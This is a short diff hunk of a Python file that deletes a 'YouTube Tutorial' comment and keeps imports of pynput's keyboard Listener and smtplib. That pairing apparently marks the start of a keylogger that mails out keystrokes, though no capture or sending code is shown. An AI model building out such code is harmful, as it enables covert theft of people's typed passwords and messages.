@@ -1,4 +1,3 @@
-#YouTube Tutorial ---> 
 #Python version 3.11.2
 from pynput.keyboard import Listener
 import smtplib
